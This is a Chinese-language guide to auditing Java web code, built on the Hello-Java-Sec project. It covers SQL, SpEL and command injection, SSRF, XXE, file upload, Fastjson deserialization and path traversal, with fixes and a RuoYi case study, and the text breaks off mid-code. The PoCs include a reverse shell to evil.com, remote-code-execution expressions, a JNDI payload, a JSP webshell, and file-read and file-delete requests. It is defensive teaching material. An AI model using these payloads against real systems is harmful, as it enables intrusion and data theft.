# Java 实战审计指南

> 基于 Hello-Java-Sec 项目的实战审计规则
> 来源: https://github.com/j3ers3/Hello-Java-Sec

## 概述

本模块整合了真实 Java 漏洞场景的审计经验，包含完整的漏洞代码、PoC和安全修复方案。

---

## SQL 注入完整审计流程

### 关键审计函数

```java
// JDBC层危险函数
Statement.executeQuery()          // 字符串拼接SQL
Connection.prepareStatement()     // 拼接后再预编译仍不安全
JdbcTemplate.queryForMap()        // 字符串拼接

// MyBatis层危险模式
${...}                            // 直接拼接，不转义
@Select("... ${field} ...")       // 注解方式也危险

// Hibernate层危险函数
Session.createQuery()             // HQL字符串拼接
Session.createSQLQuery()          // 原生SQL拼接
```

### 漏洞模式 1: JDBC 字符串拼接

```java
// ❌ Critical: 直接拼接
@GetMapping("/vul1")
public String vul1(String id) {
    String sql = "select * from users where id = '" + id + "'";  // ❌
    Statement stmt = conn.createStatement();
    ResultSet rs = stmt.executeQuery(sql);
    return result;
}

// PoC
GET /vul1?id=1' and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--+
```

### 漏洞模式 2: PreparedStatement 误用

```java
// ❌ Critical: 预编译但仍拼接字符串
@GetMapping("/vul2")
public String vul2(String id) {
    String sql = "select * from users where id = " + id;  // ❌ 先拼接
    PreparedStatement st = conn.prepareStatement(sql);    // 再预编译无效
    ResultSet rs = st.executeQuery();
    return result;
}

// PoC
GET /vul2?id=2 and 1=1
```

### 漏洞模式 3: MyBatis ${} 注入

```java
// ❌ High: MyBatis ${}
// Mapper.xml
<select id="searchVul" resultType="User">
    SELECT * FROM users WHERE name LIKE '%${user}%'  <!-- ❌ 使用${} -->
</select>

// ❌ High: Order By 注入
<select id="orderBy" resultType="User">
    SELECT * FROM users ORDER BY ${field} ${sort}  <!-- ❌ 动态字段名 -->
</select>

// Controller
@GetMapping("/vul/order")
public List<User> orderBy(String field, String sort) {
    return userMapper.orderBy(field, sort);  // ❌
}

// PoC
GET /vul/order?field=id&sort=asc,(select+sleep(3))
GET /vul/order?field=(updatexml(1,concat(0x7e,user()),1))&sort=asc
```

### 安全修复方案（5种）

#### 方案1: 参数化查询（最推荐） ⭐⭐⭐⭐⭐

```java
// ✓ JDBC PreparedStatement 正确用法
@GetMapping("/safe1")
public String safe1(String id) {
    String sql = "select * from users where id = ?";
    PreparedStatement st = conn.prepareStatement(sql);
    st.setString(1, id);  // ✓ 使用占位符
    ResultSet rs = st.executeQuery();
    return result;
}

// ✓ MyBatis #{}
<select id="searchSafe" resultType="User">
    SELECT * FROM users WHERE name LIKE CONCAT('%', #{user}, '%')  <!-- ✓ -->
</select>
```

#### 方案2: 强制类型转换 ⭐⭐⭐⭐

```java
// ✓ Integer类型，无法注入
@GetMapping("/safe4")
public Map<String, Object> safe4(Integer id) {  // ✓ 强制Integer
    String sql = "select * from users where id = " + id;
    return jdbcTemplate.queryForMap(sql);  // ✓ 安全
}

// ✓ MyBatis Integer参数
<select id="queryByIdAsInteger" resultType="User">
    SELECT * FROM users WHERE id = ${id}  <!-- ✓ 虽然用${},但Java层是Integer -->
</select>

@GetMapping("/safe/id/{id}")
public List<User> queryById(@PathVariable Integer id) {  // ✓
    return userMapper.queryByIdAsInteger(id);
}
```

#### 方案3: 白名单验证 ⭐⭐⭐⭐

```java
// ✓ Order By 白名单
@GetMapping("/safe/order")
public List<User> orderBySafe(String field, String sort) {
    // 白名单验证
    if (Security.isValidOrder(field) && Security.isValidSort(sort)) {
        return userMapper.orderBy(field, sort);  // ✓
    } else {
        // 默认安全排序
        return userMapper.orderBy("id", "desc");
    }
}

// Security.java
public static boolean isValidOrder(String content) {
    return content.matches("[0-9a-zA-Z_]+");  // ✓ 仅允许字母数字下划线
}

public static boolean isValidSort(String sort) {
    return "desc".equalsIgnoreCase(sort) || "asc".equalsIgnoreCase(sort);
}
```

#### 方案4: 正则过滤 ⭐⭐⭐

```java
// ✓ 正则白名单
@GetMapping("/safe5")
public String safe5(String name) {
    String pattern = "^[a-zA-Z0-9]+$";  // 仅字母数字
    boolean isValid = Pattern.matches(pattern, name);

    if (isValid) {
        String sql = "select * from users where user = '" + name + "'";  // ✓
        ResultSet rs = stmt.executeQuery(sql);
        return result;
    } else {
        return "非法正则匹配！";
    }
}
```

#### 方案5: 黑名单过滤 ⭐⭐ (可被绕过)

```java
// ⚠️ 黑名单可被绕过，不推荐
@GetMapping("/safe2")
public String safe2(String id) {
    if (!Security.checkSql(id)) {  // 检查黑名单
        String sql = "select * from users where id = '" + id + "'";
        ResultSet rs = stmt.executeQuery(sql);
        return result;
    } else {
        return "检测到非法注入！";
    }
}

// Security.java - 黑名单列表
public static boolean checkSql(String content) {
    String[] black_list = {"'", ";", "--", "+", ",", "%", "=", ">", "<",
        "*", "(", ")", "and", "or", "exec", "insert", "select", "delete",
        "update", "count", "drop", "chr", "mid", "master", "truncate",
        "char", "declare"};
    for (String s : black_list) {
        if (content.toLowerCase().contains(s)) {
            return true;
        }
    }
    return false;
}
```

#### 方案6: ESAPI 编码 ⭐⭐⭐

```java
// ✓ 使用OWASP ESAPI
@GetMapping("/safe3")
public String safe3(String id) {
    Codec<Character> oracleCodec = new OracleCodec();
    String sql = "select * from users where id = '" +
        ESAPI.encoder().encodeForSQL(oracleCodec, id) + "'";  // ✓
    ResultSet rs = stmt.executeQuery(sql);
    return result;
}
```

---

## SpEL 表达式注入

### 危险函数清单

```java
SpelExpressionParser.parseExpression()
StandardEvaluationContext              // 默认上下文，权限过大
Expression.getValue()
```

### 漏洞模式

```java
// ❌ Critical: 直接解析用户输入
@GetMapping("/vul")
public String vul1(String ex) {
    ExpressionParser parser = new SpelExpressionParser();
    // StandardEvaluationContext权限过大，可执行任意代码
    EvaluationContext ctx = new StandardEvaluationContext();  // ❌
    Expression exp = parser.parseExpression(ex);  // ❌
    return exp.getValue(ctx).toString();
}

// PoC - RCE
GET /vul?ex=T(java.lang.Runtime).getRuntime().exec("calc")
GET /vul?ex=T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","whoami"})
GET /vul?ex=new java.util.Scanner(new java.io.File("/etc/passwd")).useDelimiter("\\Z").next()
```

### 黑名单绕过

```java
// ❌ Medium: 黑名单过滤可绕过
@GetMapping("/vul2")
public String vul2(String ex) {
    String[] black_list = {"java.+lang", "Runtime", "exec.*\\("};
    for (String s : black_list) {
        if (Pattern.compile(s).matcher(ex).find()) {
            return "黑名单过滤";
        }
    }
    Expression exp = parser.parseExpression(ex);
    return exp.getValue().toString();  // ❌ 仍可绕过
}

// 绕过PoC
// 使用反射绕过
GET /vul2?ex=T(String).getClass().forName("java.lang.Runtime")
// 使用Unicode编码绕过
GET /vul2?ex=T(java.lang.\u0052untime)
```

### 安全修复

```java
// ✓ 使用 SimpleEvaluationContext
@GetMapping("/safe")
public String spelSafe(String ex) {
    ExpressionParser parser = new SpelExpressionParser();
    // SimpleEvaluationContext 不支持Java类型引用、构造函数和bean引用
    EvaluationContext simpleContext =
        SimpleEvaluationContext.forReadOnlyDataBinding().build();  // ✓
    Expression exp = parser.parseExpression(ex);
    return exp.getValue(simpleContext).toString();
}
```

---

## 命令注入 (RCE)

### 危险函数清单

```java
Runtime.getRuntime().exec()          // ❌ Critical
Runtime.getRuntime().load()          // ❌ 加载恶意动态库
ProcessBuilder.start()               // ❌ 可控参数时危险
ProcessImpl.start()                  // Runtime底层实现
GroovyShell.evaluate()               // ❌ Groovy脚本执行
ScriptEngineManager                  // ❌ JavaScript等脚本引擎
```

### 漏洞模式

```java
// ❌ Critical: Runtime.exec直接拼接
@GetMapping("/vul")
public String vul(String cmd) {
    Process proc = Runtime.getRuntime().exec(cmd);  // ❌

    InputStream inputStream = proc.getInputStream();
    BufferedReader br = new BufferedReader(new InputStreamReader(inputStream));
    StringBuilder sb = new StringBuilder();
    String line;
    while ((line = br.readLine()) != null) {
        sb.append(line);
    }
    return sb.toString();
}

// PoC
GET /vul?cmd=whoami
GET /vul?cmd=cat /etc/passwd
GET /vul?cmd=bash -c 'bash -i >& /dev/tcp/evil.com/4444 0>&1'
```

### 安全修复

```java
// ✓ 白名单命令
@GetMapping("/safe")
public String safe(String cmd) {
    Set<String> commands = new HashSet<>();
    commands.add("ls");
    commands.add("pwd");  // ✓ 仅允许安全命令

    String command = cmd.split("\\s+")[0];
    if (!commands.contains(command)) {
        return "不在白名单中";
    }

    Process proc = Runtime.getRuntime().exec(cmd);  // ✓
    return result;
}
```

---

## SSRF (服务端请求伪造)

### 危险函数清单

```java
URL.openConnection()
HttpURLConnection.connect()
HttpClient.execute()
OkHttpClient.newCall().execute()
Socket                               // 直接socket连接
ImageIO.read(new URL())              // 图片读取SSRF
DriverManager.getConnection()        // JDBC连接SSRF
```

### 漏洞模式

```java
// ❌ High: 直接使用用户输入的URL
@GetMapping("/vul")
public String URLConnection(String url) {
    URL u = new URL(url);  // ❌
    HttpURLConnection conn = (HttpURLConnection) u.openConnection();
    conn.connect();

    BufferedReader br = new BufferedReader(
        new InputStreamReader(conn.getInputStream()));
    return response;
}

// PoC - 内网探测
GET /vul?url=http://127.0.0.1:8080/admin
GET /vul?url=http://169.254.169.254/latest/meta-data/  // AWS元数据
GET /vul?url=file:///etc/passwd  // file协议读取文件
GET /vul?url=http://localhost:6379/  // 探测Redis
```

### 绕过黑名单

```java
// ❌ Medium: 简单过滤可绕过
@GetMapping("/vul2")
public String vul2(String url) {
    if (!Security.isHttp(url)) {
        return "不允许非http协议!!!";
    } else if (Security.isIntranet(Security.urltoIp(url))) {
        return "不允许访问内网!!!";  // ❌ 可绕过
    } else {
        return HttpClientUtils.URLConnection(url);
    }
}

// 绕过技巧
// 1. 短链接绕过
GET /vul2?url=http://surl-8.cn/0  // 短链接跳转到127.0.0.1

// 2. IP进制绕过
GET /vul2?url=http://2130706433  // 127.0.0.1的十进制
GET /vul2?url=http://0177.0.0.1  // 八进制
GET /vul2?url=http://0x7f.0.0.1  // 十六进制

// 3. URL解析差异
GET /vul2?url=http://evil.com@127.0.0.1
GET /vul2?url=http://127.0.0.1#@evil.com
```

### 安全修复

```java
// ✓ 完整防护
@GetMapping("/safe")
public String safe(String url) {
    // 1. 协议白名单
    if (!Security.isHttp(url)) {
        return "不允许非http/https协议!!!";
    }

    // 2. 域名白名单（最推荐）
    if (!Security.isWhite(url)) {
        return "非可信域名！";
    }

    // 3. 解析IP并检查是否内网
    String ip = Security.urltoIp(url);
    if (Security.isIntranet(ip)) {
        return "不允许访问内网!!!";
    }

    return HttpClientUtils.URLConnection(url);
}

// Security.java - 内网检测
public static boolean isIntranet(String ip) {
    Pattern reg = Pattern.compile(
        "^(127\\.0\\.0\\.1)|" +
        "(localhost)|" +
        "^(10\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})|" +
        "^(172\\.((1[6-9])|(2\\d)|(3[01]))\\.\\d{1,3}\\.\\d{1,3})|" +
        "^(192\\.168\\.\\d{1,3}\\.\\d{1,3})$"
    );
    return reg.matcher(ip).find();
}

// 域名白名单
public static boolean isWhite(String url) {
    List<String> url_list = Arrays.asList(
        "api.example.com",
        "cdn.example.com"
    );
    URI uri = new URI(url);
    String host = uri.getHost().toLowerCase();
    return url_list.contains(host);
}
```

---

## XXE (XML外部实体注入)

### 危险函数清单

```java
XMLReader                            // org.xml.sax
SAXReader                            // dom4j
DocumentBuilder                      // javax.xml.parsers
XMLStreamReader                      // javax.xml.stream
SAXBuilder                           // jdom2
SAXParser                            // javax.xml.parsers
Unmarshaller                         // javax.xml.bind
```

### 漏洞模式

```java
// ❌ High: DocumentBuilder 默认不安全
@PostMapping("/vul")
public String vul(String content) {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    DocumentBuilder builder = factory.newDocumentBuilder();  // ❌ 未禁用外部实体
    Document doc = builder.parse(new InputSource(new StringReader(content)));

    NodeList nodeList = doc.getElementsByTagName("person");
    Element element = (Element) nodeList.item(0);
    String name = element.getElementsByTagName("name")
        .item(0).getFirstChild().getNodeValue();
    return "姓名: " + name;
}

// PoC - 文件读取
POST /vul
Content-Type: application/xml

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<person><name>&xxe;</name></person>

// PoC - 内网探测
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<person><name>&xxe;</name></person>

// PoC - DOS攻击（Billion Laughs）
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
]>
<person><name>&lol2;</name></person>
```

### 其他XML解析器漏洞

```java
// ❌ XMLReader
@PostMapping("/XMLReader")
public String xmlReader(String content) {
    XMLReader xmlReader = XMLReaderFactory.createXMLReader();  // ❌
    xmlReader.parse(new InputSource(new StringReader(content)));
    return "XMLReader XXE";
}

// ❌ SAXReader (dom4j)
@PostMapping("/SAXReader")
public String saxReader(String content) {
    SAXReader sax = new SAXReader();  // ❌
    sax.read(new InputSource(new StringReader(content)));
    return "SAXReader XXE";
}

// ❌ SAXBuilder (jdom2)
@PostMapping("/SAXBuilder")
public String saxBuilder(String content) {
    SAXBuilder saxbuilder = new SAXBuilder();  // ❌
    saxbuilder.build(new InputSource(new StringReader(content)));
    return "SAXBuilder XXE";
}

// ❌ Unmarshaller (JAXB)
@PostMapping("/unmarshaller")
public String unmarshaller(String content) {
    JAXBContext context = JAXBContext.newInstance(Student.class);
    Unmarshaller unmarshaller = context.createUnmarshaller();
    XMLInputFactory xif = XMLInputFactory.newFactory();  // ❌
    XMLStreamReader xsr = xif.createXMLStreamReader(new StringReader(content));
    Object o = unmarshaller.unmarshal(xsr);
    return o.toString();
}
```

### 安全修复

```java
// ✓ DocumentBuilder 完整修复
@PostMapping("/safe")
public String safe(String content) {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

    // 禁用DTD（最强防护）
    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

    // 或者禁用外部实体
    factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
    factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
    factory.setXIncludeAware(false);
    factory.setExpandEntityReferences(false);

    DocumentBuilder builder = factory.newDocumentBuilder();  // ✓
    Document doc = builder.parse(new InputSource(new StringReader(content)));
    return result;
}

// ✓ 简单检测（黑名单，可绕过）
public static boolean checkXXE(String content) {
    String[] black_list = {"ENTITY", "DOCTYPE"};
    for (String s : black_list) {
        if (content.toUpperCase().contains(s)) {
            return true;  // 检测到XXE
        }
    }
    return false;
}
```

---

## 文件上传漏洞

### 漏洞模式 1: 无限制上传

```java
// ❌ Critical: 任意文件上传
@PostMapping("/uploadVul")
public String uploadVul(@RequestParam("file") MultipartFile file) {
    if (file.isEmpty()) {
        return "请选择要上传的文件";
    }

    byte[] bytes = file.getBytes();
    Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());  // ❌
    Files.write(path, bytes);

    return "上传成功：" + path;  // ❌ 暴露绝对路径
}

// PoC - 上传WebShell
POST /uploadVul
Content-Type: multipart/form-data

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.jsp"

<%@ page import="java.io.*" %>
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

### 漏洞模式 2: Content-Type 绕过

```java
// ❌ High: 仅检查Content-Type可绕过
@PostMapping("/uploadVul2")
public String uploadVul2(@RequestParam("file") MultipartFile file) {
    String contentType = file.getContentType();
    if (!"image/jpeg".equals(contentType) && !"image/png".equals(contentType)) {
        return "不允许上传该类型文件！";  // ❌ 可绕过
    }

    Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());
    Files.write(path, bytes);
    return "上传成功";
}

// 绕过 - 修改Content-Type头
POST /uploadVul2
Content-Type: multipart/form-data

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: image/jpeg  ← 伪造

<% ... webshell code ... %>
```

### 安全修复

```java
// ✓ 完整防护
@PostMapping("/uploadSafe")
public String uploadSafe(@RequestParam("file") MultipartFile file) {
    if (file.isEmpty()) {
        return "请选择要上传的文件";
    }

    String fileName = file.getOriginalFilename();

    // 1. 后缀名白名单
    String suffix = fileName.substring(fileName.lastIndexOf("."));
    String[] allowedSuffix = {".jpg", ".png", ".jpeg", ".gif", ".bmp", ".ico"};
    boolean flag = false;
    for (String s : allowedSuffix) {
        if (suffix.toLowerCase().equals(s)) {
            flag = true;
            break;
        }
    }

    if (!flag) {
        return "只允许上传图片，[.jpg, .png, .jpeg, .gif, .bmp, .ico]";
    }

    // 2. 文件名随机化
    String newFileName = UUID.randomUUID().toString() + suffix;

    // 3. 限制文件大小（application.properties）
    // spring.servlet.multipart.max-file-size=10MB

    // 4. 存储到安全目录
    Path path = Paths.get(UPLOADED_FOLDER + newFileName);  // ✓
    Files.write(path, file.getBytes());

    return "上传成功";  // ✓ 不暴露路径
}

// Security.java - 文件类型检测
public static boolean isValidFileType(String fileName) {
    String[] allowedTypes = {"jpg", "jpeg", "png", "gif", "bmp", "ico"};
    String extension = StringUtils.getFilenameExtension(fileName);
    if (extension != null) {
        for (String allowedType : allowedTypes) {
            if (allowedType.equalsIgnoreCase(extension)) {
                return true;
            }
        }
    }
    return false;
}
```

---

## Fastjson 反序列化

### 危险函数

```java
JSON.parse()                         // ❌ Critical
JSON.parseObject()                   // ❌ Critical
JSON.parseArray()                    // ❌ Critical
```

### 漏洞模式

```java
// ❌ Critical: 直接解析用户输入
@PostMapping("/vul")
public String vul(@RequestBody String content) {
    Object obj = JSON.parse(content);  // ❌ 反序列化RCE
    return obj.toString();
}

// PoC - Fastjson 1.2.24
POST /vul
Content-Type: application/json

{
    "@type":"com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName":"ldap://evil.com/Exploit",
    "autoCommit":true
}
```

### 安全修复

```java
// ✓ 开启safeMode (Fastjson 1.2.68+)
@PostMapping("/safe")
public String safe(@RequestBody String content) {
    ParserConfig.getGlobalInstance().setSafeMode(true);  // ✓
    Object obj = JSON.parse(content);
    return obj.toString();
}

// ✓ 升级到安全版本
// Fastjson >= 1.2.83
```

---

## 目录遍历 (Path Traversal)

### 漏洞模式

```java
// ❌ High: 直接拼接用户输入
@GetMapping("/download")
public void download(String filename, HttpServletResponse response) {
    String filePath = "/var/www/files/" + filename;  // ❌
    File file = new File(filePath);

    FileInputStream fis = new FileInputStream(file);
    OutputStream os = response.getOutputStream();
    byte[] buffer = new byte[1024];
    int len;
    while ((len = fis.read(buffer)) > 0) {
        os.write(buffer, 0, len);
    }
}

// PoC
GET /download?filename=../../../etc/passwd
GET /download?filename=..%2F..%2F..%2Fetc%2Fpasswd  // URL编码
```

### 安全修复

```java
// ✓ 完整防护
@GetMapping("/download")
public void download(String filename, HttpServletResponse response) {
    // 1. 检查是否包含路径遍历字符
    if (Security.checkTraversal(filename)) {
        throw new RuntimeException("非法路径！");
    }

    // 2. 白名单文件名
    if (!filename.matches("[a-zA-Z0-9._-]+")) {
        throw new RuntimeException("非法文件名！");
    }

    // 3. 使用Path.normalize()
    Path basePath = Paths.get("/var/www/files/");
    Path filePath = basePath.resolve(filename).normalize();

    // 4. 验证最终路径在允许目录内
    if (!filePath.startsWith(basePath)) {
        throw new RuntimeException("路径遍历攻击！");
    }

    File file = filePath.toFile();
    // 继续下载逻辑
}

// Security.java - 路径遍历检测
public static boolean checkTraversal(String content) {
    return content.contains("..") || content.contains("/");
}
```

---

## 审计检查清单

基于 Hello-Java-Sec 的完整审计流程：

### 1. SQL 注入

```bash
# 搜索危险模式
grep -rn "executeQuery.*\+" .
grep -rn "createQuery.*\+" .
grep -rn '\$\{' . --include="*.xml"  # MyBatis
```

**检查点：**
- [ ] Statement.executeQuery() 是否拼接字符串
- [ ] PreparedStatement 是否先拼接再预编译
- [ ] MyBatis XML 是否使用 ${}
- [ ] MyBatis Order By 是否使用 ${}
- [ ] JdbcTemplate 是否字符串拼接

### 2. SpEL 注入

```bash
grep -rn "SpelExpressionParser" .
grep -rn "parseExpression" .
grep -rn "StandardEvaluationContext" .
```

**检查点：**
- [ ] 是否使用 StandardEvaluationContext
- [ ] parseExpression 参数是否用户可控

### 3. 命令注入

```bash
grep -rn "Runtime.getRuntime().exec" .
grep -rn "ProcessBuilder" .
grep -rn "\.exec\(" .
```

**检查点：**
- [ ] Runtime.exec() 参数是否可控
- [ ] ProcessBuilder 参数是否可控
- [ ] 是否有命令白名单

### 4. SSRF

```bash
grep -rn "URL.*openConnection" .
grep -rn "HttpClient" .
grep -rn "OkHttpClient" .
```

**检查点：**
- [ ] URL 是否用户可控
- [ ] 是否有域名白名单
- [ ] 是否检查内网IP

### 5. XXE

```bash
grep -rn "DocumentBuilderFactory" .
grep -rn "SAXParserFactory" .
grep -rn "XMLReader" .
```

**检查点：**
- [ ] 是否禁用 DTD
- [ ] 是否禁用外部实体

### 6. 文件上传

```bash
grep -rn "MultipartFile" .
grep -rn "getOriginalFilename" .
```

**检查点：**
- [ ] 是否有后缀名白名单
- [ ] 是否验证文件内容
- [ ] 文件名是否随机化

### 7. 反序列化

```bash
grep -rn "JSON.parse" .
grep -rn "readObject" .
grep -rn "Yaml.load" .
```

**检查点：**
- [ ] Fastjson 版本是否安全
- [ ] 是否开启 safeMode
- [ ] readObject 输入是否可控

---

## 真实项目审计案例：若依管理系统

### 项目背景

**项目**: RuoYi v3.1 (若依管理系统)
**技术栈**: Spring Boot 2.0.5 + MyBatis + Shiro + Druid
**代码规模**: 206个Java文件
**审计时间**: 2025-12-28

### 漏洞清单

| 漏洞类型 | 严重程度 | 文件位置 | CVSS |
|---------|---------|---------|------|
| 任意文件读取/删除 | Critical | CommonController.java:24 | 9.1 |
| XSS过滤器不完整 | High | XssHttpServletRequestWrapper.java | 7.2 |
| 文件上传验证缺失 | High | FileUploadUtils.java:153 | 6.8 |
| MyBatis SQL注入风险 | Medium | SysDeptMapper.xml:51 | 6.5 |
| 配置文件敏感信息 | Low | application-druid.yml | 5.5 |

---

### 案例1: 任意文件读取/删除 (CVSS 9.1)

#### 漏洞代码

```java
// CommonController.java:24-45
package com.ruoyi.web.controller.common;

@Controller
public class CommonController {

    @RequestMapping("common/download")
    public void fileDownload(String fileName, Boolean delete,
                            HttpServletResponse response,
                            HttpServletRequest request) {
        // ❌ 关键漏洞: 直接拼接用户可控的fileName
        String realFileName = System.currentTimeMillis()
            + fileName.substring(fileName.indexOf("_") + 1);

        try {
            String filePath = Global.getDownloadPath() + fileName;  // ❌ 路径拼接

            response.setCharacterEncoding("utf-8");
            response.setContentType("multipart/form-data");
            response.setHeader("Content-Disposition",
                "attachment;fileName=" + setFileDownloadHeader(request, realFileName));

            FileUtils.writeBytes(filePath, response.getOutputStream());  // ❌ 读取

            if (delete) {
                FileUtils.deleteFile(filePath);  // ❌ 删除任意文件！
            }
        } catch (Exception e) {
            log.error("下载文件失败", e);
        }
    }
}

// FileUtils.java:22-69
public static void writeBytes(String filePath, OutputStream os) throws IOException {
    FileInputStream fis = null;
    try {
        File file = new File(filePath);  // ❌ 无路径验证
        if (!file.exists()) {
            throw new FileNotFoundException(filePath);
        }
        fis = new FileInputStream(file);  // ❌ 直接读取
        byte[] b = new byte[1024];
        int length;
        while ((length = fis.read(b)) > 0) {
            os.write(b, 0, length);
        }
    } finally {
        // ...
    }
}
```

#### 审计发现过程

```bash
# 1. 搜索文件下载接口
grep -rn "@RequestMapping.*download" --include="*.java"
# 发现: CommonController.java:24

# 2. 检查文件路径拼接
grep -rn "String.*filePath.*=.*\\+" --include="*.java"
# 发现: String filePath = Global.getDownloadPath() + fileName;

# 3. 追踪FileUtils调用
grep -rn "FileUtils.writeBytes\|FileUtils.deleteFile" --include="*.java"
# 发现: 无路径验证直接调用

# 4. 验证漏洞
# - fileName参数完全用户可控
# - 无路径规范化（getCanonicalPath）
# - 无../遍历检查
# - delete参数可删除任意文件
```

#### PoC

```bash
# 读取任意文件
GET /common/download?fileName=../../../../etc/passwd HTTP/1.1

# 读取应用配置
GET /common/download?fileName=../../../../app/application.yml HTTP/1.1

# 删除任意文件（高危）
GET /common/download?fileName=../../../../tmp/test.txt&delete=true HTTP/1.1

# 读取.class文件反编译
GET /common/download?fileName=../../../../app/WEB-INF/classes/com/ruoyi/web/controller/system/SysUserController.class HTTP/1.1
```

#### 攻击链

```
1. 路径遍历读取 application.yml
   ↓
2. 获取数据库密码: password: password
   ↓
3. 访问 /monitor/druid/ (无认证)
   ↓
4. 获取数据库连接信息
   ↓
5. 直连数据库完全控制
```

#### 修复方案

```java
// ✓ 安全修复
@RequestMapping("common/download")
public void fileDownload(String fileName, Boolean delete, ...) {
    try {
        // 1. 文件名白名单验证
        if (!isValidFileName(fileName)) {
            throw new SecurityException("非法文件名");
        }

        // 2. 路径规范化
        File downloadDir = new File(Global.getDownloadPath());
        File requestedFile = new File(downloadDir, fileName);
        String canonicalPath = requestedFile.getCanonicalPath();
        String canonicalBasePath = downloadDir.getCanonicalPath();

        // 3. 确保文件在允许的目录内
        if (!canonicalPath.startsWith(canonicalBasePath)) {
            throw new SecurityException("路径遍历攻击");
        }

        // 4. 权限检查
        if (!hasDownloadPermission(fileName)) {
            throw new SecurityException("无权限下载");
        }

        FileUtils.writeBytes(canonicalPath, response.getOutputStream());

        // ❌ 建议移除delete功能，或严格限制
    } catch (SecurityException e) {
        log.warn("安全异常: {}", e.getMessage());
        response.sendError(HttpServletResponse.SC_FORBIDDEN);
    }
}

private boolean isValidFileName(String fileName) {
    // 检查非法字符
    if (fileName.contains("..") || fileName.contains("/")
        || fileName.contains("\\")) {
        return false;
    }
    // 文件名白名单模式
    return fileName.matches("^[a-zA-Z0-9_\\-\\.]+$");
}
```

---

### 案例2: MyBatis 数据权限SQL注入风险 (CVSS 6.5)

#### 漏洞代码

```xml
<!-- SysDeptMapper.xml:38-52 -->
<select id="selectDeptList" parameterType="SysDept" resultMap="SysDeptResult">
    <include refid="selectDeptVo"/>
    where d.del_flag = '0'
    <if test="parentId != null and parentId != 0">
        AND parent_id = #{parentId}
    </if>
    <if test="deptName != null and deptName != ''">
        AND dept_name like concat('%', #{deptName}, '%')  <!-- ✓ 安全 -->
    </if>
    <if test="status != null and status != ''">
        AND status = #{status}
    </if>
    <!-- ❌ 数据范围过滤 - 使用${} -->
    ${params.dataScope}
</select>
```

```java
// DataScopeAspect.java:74-105
@Aspect
@Component
public class DataScopeAspect {

    protected void handleDataScope(final JoinPoint joinPoint) {
        SysUser currentUser = ShiroUtils.getSysUser();
        if (currentUser != null) {
            if (!currentUser.isAdmin()) {
                dataScopeFilter(joinPoint, currentUser,
                    controllerDataScope.tableAlias());
            }
        }
    }

    public static void dataScopeFilter(JoinPoint joinPoint, SysUser user, String alias) {
        StringBuilder sqlString = new StringBuilder();

        for (SysRole role : user.getRoles()) {
            String dataScope = role.getDataScope();
            if (DATA_SCOPE_ALL.equals(dataScope)) {
                sqlString = new StringBuilder();
                break;
            } else if (DATA_SCOPE_CUSTOM.equals(dataScope)) {
                // ❌ 关键问题: 使用字符串拼接而非参数化
                sqlString.append(StringUtils.format(
                    " OR {}.dept_id IN ( SELECT dept_id FROM sys_role_dept WHERE role_id = {} ) ",
                    alias, role.getRoleId()  // ❌ 虽然来自内部，但设计不安全
                ));
            }
        }

        if (StringUtils.isNotBlank(sqlString.toString())) {
            BaseEntity baseEntity = (BaseEntity) joinPoint.getArgs()[0];
            // ❌ 将拼接的SQL片段放入params，然后在XML中用${}
            baseEntity.getParams().put(DATA_SCOPE, " AND (" + sqlString.substring(4) + ")");
        }
    }
}
```

#### 审计发现过程

```bash
# 1. 搜索MyBatis ${}用法
grep -rn '\$\{' --include="*.xml"
# 发现多处: ${params.dataScope}

# 2. 追踪dataScope来源
grep -rn "dataScope" --include="*.java"
# 发现: DataScopeAspect.java

# 3. 分析AOP切面逻辑
grep -rn "@Aspect" --include="*.java" -A 50 | grep -i "sql"
# 发现: 使用StringUtils.format()拼接SQL

# 4. 检查concat()用法（对比）
grep -rn "concat\(" --include="*.xml"
# 发现: 大部分地方使用concat('%', #{param}, '%') - 安全
```

#### 风险分析

虽然这不是直接的SQL注入（因为`alias`来自`@DataScope`注解，`roleId`来自数据库），但存在以下问题：

1. **设计缺陷**: 违反"所有SQL参数化"的安全原则
2. **潜在风险**: 如果注解配置可被篡改或存在其他代码注入点
3. **维护风险**: 后续开发可能错误地将用户输入注入到params中

#### 修复建议

```java
// ✓ 重构方案1: 完全避免${}

// Mapper接口增加参数
List<SysDept> selectDeptList(@Param("dept") SysDept dept,
                              @Param("dataScopeIds") List<Long> dataScopeIds);

// XML改为参数化
<select id="selectDeptList" resultMap="SysDeptResult">
    <include refid="selectDeptVo"/>
    where d.del_flag = '0'
    <if test="dataScopeIds != null and dataScopeIds.size() > 0">
        AND d.dept_id IN
        <foreach collection="dataScopeIds" item="id" open="(" close=")" separator=",">
            #{id}
        </foreach>
    </if>
</select>

// Aspect改为传递ID列表
public static void dataScopeFilter(...) {
    List<Long> allowedDeptIds = new ArrayList<>();
    for (SysRole role : user.getRoles()) {
        if (DATA_SCOPE_CUSTOM.equals(role.getDataScope())) {
            allowedDeptIds.addAll(getDeptIdsByRole(role.getRoleId()));
        }
    }
    baseEntity.getParams().put("dataScopeIds", allowedDeptIds);
}
```

---

### 案例3: XSS过滤器不完整 (CVSS 7.2)

#### 漏洞代码

```java
// XssHttpServletRequestWrapper.java
package com.ruoyi.common.xss;

public class XssHttpServletRequestWrapper extends HttpServletRequestWrapper {

